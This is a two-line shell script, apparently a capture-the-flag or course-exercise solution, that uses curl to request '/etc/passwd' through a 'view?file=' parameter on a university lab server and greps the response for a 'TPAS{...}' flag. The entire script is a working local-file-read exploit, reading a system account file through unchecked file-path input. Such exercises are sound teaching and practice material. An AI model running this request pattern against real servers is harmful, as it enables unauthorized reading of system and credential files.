#!/bin/sh

curl --silent http://tpas.alunos.dcc.fc.up.pt:5013/view?file=//etc//passwd | grep -oE "TPAS{.*?}" --color=none
